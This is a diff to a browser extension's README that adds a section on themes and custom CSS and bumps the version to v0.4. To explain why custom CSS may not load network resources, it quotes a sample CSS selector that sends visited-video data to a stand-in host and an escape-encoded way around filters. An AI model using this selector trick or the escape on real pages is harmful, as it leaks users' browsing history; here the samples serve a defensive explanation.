@@ -45,6 +45,22 @@ Open it with **Alt+Shift+H** (change it under *about:addons → ⚙ → Manage E
 - **Keyboard:** Vimium can't run on extension pages (a browser rule, not a bug), so the home page has its own vim-style keys. `Esc` or `Ctrl+[` leaves the search box, `/` or `i` goes back; `j`/`k` move through items, `Enter`/`o` open (`O` in a new tab), `x` forgets, `gg`/`G` jump, `f`/`F` show link hints, `r` refreshes, `?` lists them all.
 - **Thumbnails are off by default**, because loading them tells the video site which videos are on your page. Turn them on in the footer; if you've added an Invidious instance they load through it instead of from YouTube.
 
+## Themes
+
+*Settings → Appearance* has five looks: **Auto** (follows your system), **Sumi** (ink dark), **Washi** (paper light), **Aero** (glossy sky-and-bubbles Frutiger Aero) and **Aero Night**. They apply to the popup, settings and home page.
+
+**Custom CSS** goes on top of any theme and always wins. The easiest way to make your own theme is to override the variables:
+
+```css
+:root {
+  --paper: #f3effa;  --card: #fbf9ff;  --ink: #2a2140;
+  --shu: #7b5cd6;    --shu-soft: rgba(123, 92, 214, .14);
+  --page-bg: linear-gradient(160deg, #f3effa, #e6dcfb);
+}
+```
+
+Also available: `--paper-2`, `--field`, `--ink-2`, `--ink-3`, `--rule`, `--ok`, `--sans`, `--serif`. Custom CSS **can't load anything from the network**: no `@import`, no `url(https://…)`, no `image-set()`. Images must be `data:` URLs. That isn't fussiness. A theme pasted from the internet could otherwise use selectors like `a[href*="<video id>"] { background: url(https://someone.example/seen) }` to quietly report your history. The check decodes CSS escapes before looking, so `u\72 l(` doesn't sneak through.
+
 ## How it works
 
 ```
@@ -178,7 +194,7 @@ test/                      node:test suites, incl. two devices syncing through a
 
 ## Status
 
-v0.3. The core, crypto, relay and sync are covered by tests (including a property test of the CRDT laws and a two-device sync through a real relay process). The content scripts are tested against simulated pages and players for every kind of site, not against the live sites, which change their markup often; if one breaks, its selectors are in `content/adapters.js`.
+v0.4. The core, crypto, relay and sync are covered by tests (including a property test of the CRDT laws and a two-device sync through a real relay process). The content scripts are tested against simulated pages and players for every kind of site, not against the live sites, which change their markup often; if one breaks, its selectors are in `content/adapters.js`.
 
 Not yet: changing the passphrase, pruning old tombstones, custom instances in Safari (it can't register content scripts for new sites at runtime).
 
